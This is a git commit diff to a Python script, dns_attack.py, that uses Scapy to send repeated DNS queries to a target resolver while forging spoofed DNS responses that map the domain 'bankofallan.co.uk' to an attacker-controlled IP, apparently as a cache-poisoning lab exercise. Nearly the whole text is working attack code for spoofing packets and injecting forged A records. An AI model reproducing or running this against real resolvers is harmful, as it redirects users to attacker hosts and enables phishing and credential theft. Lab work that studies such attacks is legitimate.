d21d30591f4b68a84c6bc4841ad4c8ea5a665ffb
root <psp300xxx@gmail.com>
2019-05-10 15:51:06 +0200

    update

--- dns_attack.py
+++ dns_attack.py
@@ -12,25 +12,29 @@ def launch_dns_listen_server(ip, port, buffer_size):
     udp_socket.bind((ip, port))
     return udp_socket
 def launch_dns_attack(destination_ip, destination_port,query_name, is_finished):
+    print("Starting query to DNS")
     while not is_finished[0]:
         #launch dns request
         dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name))
-        answer = sr1(dns_req, verbose=0)
-        manage_answer(answer)
-        time.sleep(1)
+        send(dns_req)
+        # answer = sr1(dns_req, verbose=0)
+        # manage_answer(answer)
+        # time.sleep(1)
 def manage_answer(answer):
         # print(answer[DNS].show())
         return
 def poison_cache(destination_ip, destination_port,bad_guy_ip,bad_guy_port, query_to_forger,is_finished):
+        print("Starting poison attack...")
         while not is_finished[0]:
-                sniffed_packets=sniff(filter="port "+str(bad_guy_port),count=1,promisc=1)
-                for i in sniffed_packets:
-                        src = i[Raw].load
+                # sniffed_packets=sniff(filter="port "+str(bad_guy_port),count=1,promisc=1)
+                # for i in sniffed_packets:
+                #         src = i[Raw].load
                         # print(src)
                         # print(i[UDP].show())
-                        string = '.'.join(str(ord(c)) for c in src)
+                        # string = '.'.join(str(ord(c)) for c in src)
                         # print(string)
                 dns_resp = IP(dst=destination_ip, src=bad_guy_ip)/UDP(dport=destination_port,sport=bad_guy_port)/DNS(id=0,qd=DNSQR(qname=query_name),an=DNSRR(rrname=query_to_forger, type='A',rdata=bad_guy_ip, ttl=100))
+                print("Sending corrupted response attack")
                 send(dns_resp)
                 # dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name)) 
                       
@@ -44,6 +48,7 @@ udp_listen_port = 1337
 buffer_size = 1024
 query_name = "badguy.ru"
 query_to_forger = "bankofallan.co.uk"
+
 #variable to sync threads
 is_finished = [False]
 # Launching an asyncronous Thread performing DNS Cache Poisoning
@@ -52,6 +57,7 @@ poisoner_thread = threading.Thread(target=poison_cache, args=(dns_to_attack_ip,d
 # Launching UDP server in listen mode in order to receive the UDP packet
 # containing the secret
 udp_socket = launch_dns_listen_server(local_ip, udp_listen_port, buffer_size)
+
 attacker_thread.start()
 poisoner_thread.start()
 bytePair = udp_socket.recvfrom(buffer_size)
